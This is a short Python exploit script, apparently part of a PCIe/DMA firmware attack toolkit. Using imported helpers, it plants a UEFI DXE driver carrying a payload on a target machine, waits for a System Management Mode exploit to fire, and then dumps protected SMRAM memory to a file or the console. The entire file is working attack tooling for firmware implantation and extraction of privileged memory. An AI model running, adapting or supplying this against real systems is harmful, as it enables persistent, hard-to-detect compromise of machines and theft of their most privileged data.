#!/usr/bin/env python

import sys, os
from struct import pack, unpack
from hexdump import hexdump

from pcie_lib import *
from uefi import *

def main():       

    payload = sys.argv[1] if len(sys.argv) > 1 else None

    dev = dxe_inject(payload = payload)
        
    print('[+] DXE driver was planted, waiting for SMM exploit...')
    
    if payload is None: return 0

    while True:

        # wait for exploitation
        status, buff_addr = unpack('QQ', dev.mem_read(STATUS_ADDR, 8 * 2))
        
        if status == 0:

            # not ready yet
            time.sleep(1)
            continue            

        print('[+] DXE driver was executed')

        if buff_addr != 0:

            print('[+] System Management Mode payload was executed')
            print('[+] Collecting SMRAM dump from 0x%.8x...\n' % buff_addr)

            if len(sys.argv) > 2:

                output = sys.argv[2]        

                # dump SMRAM into the output file
                with open(output, 'wb') as fd:

                    ptr = 0

                    while ptr <= MAX_TSEG_SIZE:

                        fd.write(dev.mem_read(buff_addr + ptr, PAGE_SIZE))
                        ptr += PAGE_SIZE

            else:

                # just print some SMRAM data to stdout
                print(hexdump(dev.mem_read(buff_addr, 0x100)))

        else:

            print('[!] System Management Mode payload was not executed')

        break

    print('[+] DONE')
    
    dev.close()

    return 0

if __name__ == '__main__':

    exit(main())
